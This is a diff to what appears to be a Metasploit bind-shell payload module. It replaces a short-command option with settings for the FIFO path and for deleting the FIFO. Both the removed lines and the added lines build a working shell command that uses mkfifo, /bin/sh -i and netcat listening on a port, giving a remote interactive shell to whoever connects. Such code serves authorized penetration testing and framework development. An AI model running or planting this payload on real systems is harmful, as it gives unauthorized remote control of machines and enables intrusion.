@@ -37,7 +37,8 @@ module MetasploitModule
       [
         OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
         OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh']),
-        OptBool.new('ShortCommand', [false, 'Use a shorter command string (hardcoded mkfifo name and shell)', false])
+        OptString.new('FifoPath', [true, 'The path to the FIFO file to use, default is random', "/tmp/#{Rex::Text.rand_text_alpha_lower(4..7)}"]),
+        OptBool.new('DeleteFifo', [true, 'Whether to delete the FIFO file after execution', true])
       ]
     )
   end
@@ -54,12 +55,8 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    if datastore['ShortCommand']
-      payload = "mkfifo p;#{datastore["ShellPath"]} -i<p 2>&1|#{datastore["NetcatPath"]} -l #{datastore['LPORT']}>p"
-    else
-      backpipe = Rex::Text.rand_text_alpha_lower(4..7)
-      payload = "mkfifo /tmp/#{backpipe}; (#{datastore['NetcatPath']} -l -p #{datastore['LPORT']} ||#{datastore['NetcatPath']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
-    end
-    payload
+    command = "mkfifo #{datastore['FifoPath']}; #{datastore['ShellPath']} -i <#{datastore['FifoPath']} 2>&1 | #{datastore['NetcatPath']} -lp #{datastore['LPORT']} >#{datastore['FifoPath']}"
+    command += "; rm #{datastore['FifoPath']}" if datastore['DeleteFifo']
+    command
   end
 end
